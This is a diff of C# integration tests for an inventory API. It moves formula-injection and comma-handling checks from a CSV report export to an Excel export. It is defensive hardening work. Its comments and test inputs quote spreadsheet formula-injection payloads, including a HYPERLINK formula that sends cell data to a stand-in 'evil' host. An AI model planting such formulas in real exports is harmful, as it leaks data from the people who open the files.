@@ -201,97 +201,74 @@ public class InputHardeningTests(BodegaApiFactory factory) : IntegrationTestBase
     // ---- Report export: what happens to the data after it leaves the API ----
 
     /// <summary>
-    ///     CSV formula injection. A product name is free text written by any
-    ///     WAREHOUSE employee; the CSV export is opened by the owner, in Excel.
-    ///     A leading '=', '+', '-' or '@' makes the spreadsheet treat that cell
-    ///     as a formula, so a name like =HYPERLINK("http://evil/?d="&amp;A1)
-    ///     runs on the owner's machine when they open the export.
+    ///     Excel formula injection. A product name is free text written by any
+    ///     WAREHOUSE employee; the export is opened by the owner, in Excel. A
+    ///     name like =HYPERLINK("http://evil/?d="&amp;A1) must never become a
+    ///     live formula there — neither the moment the file is opened, nor
+    ///     later if the owner clicks into that cell and confirms it (F2,
+    ///     Enter) without changing anything, which re-evaluates a
+    ///     General-format cell's content from scratch.
     ///
-    ///     The exported field must therefore be quoted and neutralised, never
-    ///     interpolated raw.
+    ///     ExcelReportGenerator.WriteText guarantees both: the value is a
+    ///     plain string, never a ClosedXML formula assignment (so no &lt;f&gt;
+    ///     element is ever emitted), and the cell's number format is
+    ///     explicitly Text ("@"), so Excel treats it as text permanently
+    ///     rather than re-guessing on next interaction.
     /// </summary>
     [Theory]
     [InlineData("=HYPERLINK(\"http://evil.test\",\"click\")")]
     [InlineData("+1+1")]
     [InlineData("-1+1")]
     [InlineData("@SUM(A1:A9)")]
-    public async Task ReportCsvExport_NeutralisesSpreadsheetFormulas(string hostileName)
+    public async Task ReportExcelExport_NeutralisesSpreadsheetFormulas(string hostileName)
     {
         var client = await CreateBusinessAsync();
         var productId = await CreateProductAsync(client, name: hostileName);
         var warehouseId = await GetDefaultWarehouseIdAsync(client);
         (await RegisterStockIntakeAsync(client, productId, warehouseId, quantity: 5)).EnsureSuccessStatusCode();
 
-        var csv = await ExportCsvAsync(client, "INVENTORY");
+        using var workbook = await ExportInventoryExcelAsync(client);
+        var sheet = workbook.Worksheet("Inventario");
+        var productNameCell = sheet.Cell(5, 2); // row 5 = first data row; column 2 = "Producto".
 
-        foreach (var line in csv.Split('\n').Skip(1).Where(line => !string.IsNullOrWhiteSpace(line)))
-        {
-            foreach (var field in SplitCsvFields(line))
-            {
-                Assert.False(field.Length > 0 && field[0] is '=' or '+' or '-' or '@',
-                    $"exported CSV field starts with a formula character and will execute in a spreadsheet: {field}");
-            }
-        }
+        Assert.Equal(hostileName, productNameCell.GetString());
+        Assert.False(productNameCell.HasFormula,
+            $"exported cell for product name '{hostileName}' is a live formula, not text");
+        Assert.Equal("@", productNameCell.Style.NumberFormat.Format);
     }
 
     /// <summary>
-    ///     A comma or a newline inside a product name must not be able to
-    ///     invent extra columns or rows in the export — that silently corrupts
-    ///     every figure to the right of it.
+    ///     A comma inside a product name is just characters in a single xlsx
+    ///     cell — unlike CSV, there is no delimiter for it to be mistaken for,
+    ///     so nothing can shift a later column. This only confirms the value
+    ///     survives the round trip unmodified.
     /// </summary>
     [Fact]
-    public async Task ReportCsvExport_QuotesSeparatorsInsideValues()
+    public async Task ReportExcelExport_PreservesCommasInsideValues()
     {
         var client = await CreateBusinessAsync();
-        var productId = await CreateProductAsync(client, name: "Arroz, costal 50kg");
+        const string productName = "Arroz, costal 50kg";
+        var productId = await CreateProductAsync(client, name: productName);
         var warehouseId = await GetDefaultWarehouseIdAsync(client);
         (await RegisterStockIntakeAsync(client, productId, warehouseId, quantity: 5)).EnsureSuccessStatusCode();
 
-        var csv = await ExportCsvAsync(client, "INVENTORY");
+        using var workbook = await ExportInventoryExcelAsync(client);
+        var sheet = workbook.Worksheet("Inventario");
 
-        var dataRows = csv.Split('\n').Skip(1).Where(line => !string.IsNullOrWhiteSpace(line)).ToList();
-        Assert.NotEmpty(dataRows);
-
-        // ProductId,ProductName,CurrentStock — exactly three fields, whatever the name contains.
-        foreach (var row in dataRows)
-            Assert.Equal(3, SplitCsvFields(row).Count);
+        Assert.Equal(productName, sheet.Cell(5, 2).GetString());
+        Assert.Equal(5, sheet.Cell(5, 3).GetValue<int>()); // "Stock actual" still its own, unshifted column.
     }
 
-    private static async Task<string> ExportCsvAsync(HttpClient client, string type)
+    private static async Task<ClosedXML.Excel.XLWorkbook> ExportInventoryExcelAsync(HttpClient client)
     {
         var generated = await client.PostAsJsonAsync("/api/v1/reports",
-            new { type, dateFrom = (DateOnly?)null, dateTo = (DateOnly?)null });
+            new { type = "INVENTORY", dateFrom = (DateOnly?)null, dateTo = (DateOnly?)null });
         generated.EnsureSuccessStatusCode();
         var reportId = (await ReadJsonAsync(generated)).GetProperty("id").GetInt32();
 
-        var export = await client.GetAsync($"/api/v1/reports/{reportId}/export");
+        var export = await client.GetAsync($"/api/v1/reports/{reportId}/export/excel");
         export.EnsureSuccessStatusCode();
-        return await export.Content.ReadAsStringAsync();
-    }
-
-    /// <summary>Minimal RFC 4180 field splitter — enough to tell a quoted comma from a real separator.</summary>
-    private static List<string> SplitCsvFields(string line)
-    {
-        var fields = new List<string>();
-        var current = new System.Text.StringBuilder();
-        var inQuotes = false;
-
-        for (var index = 0; index < line.Length; index++)
-        {
-            var character = line[index];
-
-            if (inQuotes)
-            {
-                if (character != '"') current.Append(character);
-                else if (index + 1 < line.Length && line[index + 1] == '"') { current.Append('"'); index++; }
-                else inQuotes = false;
-            }
-            else if (character == '"') inQuotes = true;
-            else if (character == ',') { fields.Add(current.ToString()); current.Clear(); }
-            else if (character != '\r') current.Append(character);
-        }
-
-        fields.Add(current.ToString());
-        return fields;
+        var bytes = await export.Content.ReadAsByteArrayAsync();
+        return new ClosedXML.Excel.XLWorkbook(new MemoryStream(bytes));
     }
 }
